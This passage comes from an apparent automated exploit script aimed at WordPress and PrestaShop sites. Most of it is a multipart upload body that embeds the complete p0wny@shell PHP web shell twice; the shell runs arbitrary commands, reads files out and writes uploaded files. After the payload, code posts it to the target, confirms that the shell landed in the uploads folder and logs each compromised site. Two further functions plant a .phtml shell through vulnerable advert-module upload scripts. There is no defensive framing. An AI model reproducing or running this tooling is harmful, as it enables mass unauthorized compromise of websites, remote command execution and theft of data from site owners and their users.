historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------121585879226594965303252407916\r\nContent-Disposition: form-data; name=\"widget_file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------121585879226594965303252407916\r\nContent-Disposition: form-data; name=\"customizer_file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------121585879226594965303252407916--\r\n"
        session.post(exploit_url, headers=header, data=shell_payload, timeout=20)
        shell = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/' + str(datetime.now().strftime('%Y')) + '/' + str(datetime.now().strftime('%m')) + '/shell.php'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #10 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #10 -->> {red}Failed Exploit !")
    except:pass
    
def Columnad2(url):
	try:
		data = {'userfile': open(phtml, 'rb')}
		p = ('https://' + url + '/modules/columnadverts2/uploadimage.php')
		c = ('http://' + url+'/modules/columnadverts2/slides/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Columnad2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Columnad2 -->> {red}Not Vuln !")
	except:pass       
 
def Propagead2(url):
	try:
		data = {'userfile':open(phtml, 'rb')}
		p = ('https://' + url + '/modules/productpageadverts2/uploadimage.php')
		c = ('http://' + url+'/modules/productpageadverts2/slides/axv.phtml')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
